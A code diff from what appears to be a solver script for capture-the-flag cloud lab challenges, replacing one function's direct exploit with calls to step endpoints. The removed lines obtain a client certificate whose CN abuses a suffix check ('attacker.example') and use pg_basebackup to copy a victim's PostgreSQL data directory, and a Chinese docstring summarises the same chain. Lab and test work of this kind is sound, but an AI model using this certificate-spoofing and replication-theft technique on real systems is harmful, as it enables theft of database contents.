@@ -263,23 +263,12 @@ def cloud_10(base: str, flag: str) -> None:
 
 
 def cloud_16(base: str, flag: str) -> None:
-    cert = json_request("POST", "http://127.0.0.1:10716/sign", {
-        "cn": "replication.eee03a2acfe6.database.azure.com.attacker.example"}).json()
-    with tempfile.TemporaryDirectory() as directory:
-        cert_path, key_path = os.path.join(directory, "client.crt"), os.path.join(directory, "client.key")
-        with open(cert_path, "wb") as f:
-            f.write(base64.b64decode(cert["cert"]))
-        with open(key_path, "wb") as f:
-            f.write(base64.b64decode(cert["key"]))
-        os.chmod(key_path, 0o600)
-        result = subprocess.run(["pg_basebackup", "-h", "127.0.0.1", "-p", "10627", "-U", "replication",
-            "-d", "dbname=postgres", "-D", os.path.join(directory, "backup"), "-X", "none", "--no-password"],
-            env={**os.environ, "PGSSLMODE": "require", "PGSSLCERT": cert_path, "PGSSLKEY": key_path},
-            capture_output=True, text=True, timeout=90)
-        assert result.returncode == 0, result.stderr
-        found = subprocess.run(["grep", "-rao", r"flag{[^}]*}", os.path.join(directory, "backup")],
-                               capture_output=True, text=True).stdout
-        require_flag(found, flag)
+    """租户控制台在共享内网里：取 CN 有缺陷的客户端证书 → pg_basebackup 拉走受害者数据目录。"""
+    http("POST", f"{base}/step1")
+    signed = http("POST", f"{base}/step2")
+    assert "Signed CN=" in signed.body, signed.body
+    result = http("POST", f"{base}/step3")
+    require_flag(result.body, flag)
 
 
 def cloud_17(base: str, flags: list[str]) -> None:
